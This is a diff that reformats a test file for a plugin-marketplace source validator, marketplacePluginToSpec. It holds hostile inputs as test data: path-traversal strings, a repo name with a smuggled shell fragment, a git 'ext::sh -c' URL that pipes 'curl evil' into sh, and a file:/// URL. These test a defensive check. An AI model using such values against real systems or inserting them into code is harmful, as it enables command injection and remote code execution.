@@ -153,15 +153,21 @@ describe("marketplacePluginToSpec", () => {
   });
 
   it("rejects string sources that traverse above the marketplace repo", () => {
-    expect(() => marketplacePluginToSpec(plugin("../../secrets"), "acme/marketplace")).toThrow(/Unsafe marketplace path/);
+    expect(() => marketplacePluginToSpec(plugin("../../secrets"), "acme/marketplace")).toThrow(
+      /Unsafe marketplace path/
+    );
   });
 
   it("rejects parent segments hidden inside a pluginRoot-joined source", () => {
-    expect(() => marketplacePluginToSpec(plugin("example/../.."), "acme/marketplace", "plugins")).toThrow(/Unsafe marketplace path/);
+    expect(() => marketplacePluginToSpec(plugin("example/../.."), "acme/marketplace", "plugins")).toThrow(
+      /Unsafe marketplace path/
+    );
   });
 
   it("rejects malformed owner/repo string sources", () => {
-    expect(() => marketplacePluginToSpec(plugin('acme/evil"; curl'), "acme/marketplace")).toThrow(/Unsafe marketplace repo/);
+    expect(() => marketplacePluginToSpec(plugin('acme/evil"; curl'), "acme/marketplace")).toThrow(
+      /Unsafe marketplace repo/
+    );
   });
 
   it("converts a safe https url object source to a git source", () => {
@@ -174,19 +180,21 @@ describe("marketplacePluginToSpec", () => {
   });
 
   it("rejects a url object source that would run a command", () => {
-    expect(() => marketplacePluginToSpec(plugin({ source: "url", url: "ext::sh -c 'curl evil|sh'" }), "acme/marketplace")).toThrow(
-      /Unsafe git url/
-    );
+    expect(() =>
+      marketplacePluginToSpec(plugin({ source: "url", url: "ext::sh -c 'curl evil|sh'" }), "acme/marketplace")
+    ).toThrow(/Unsafe git url/);
   });
 
   it("rejects github object sources with a malformed repo", () => {
-    expect(() => marketplacePluginToSpec(plugin({ source: "github", repo: "acme/../etc" }), "acme/marketplace")).toThrow(
-      /Unsafe marketplace repo/
-    );
+    expect(() =>
+      marketplacePluginToSpec(plugin({ source: "github", repo: "acme/../etc" }), "acme/marketplace")
+    ).toThrow(/Unsafe marketplace repo/);
   });
 
   it("rejects a local file url object source", () => {
-    expect(() => marketplacePluginToSpec(plugin({ source: "url", url: "file:///c:/Windows" }), "acme/marketplace")).toThrow(/Unsafe git url/);
+    expect(() =>
+      marketplacePluginToSpec(plugin({ source: "url", url: "file:///c:/Windows" }), "acme/marketplace")
+    ).toThrow(/Unsafe git url/);
   });
 
   it("converts github object sources", () => {
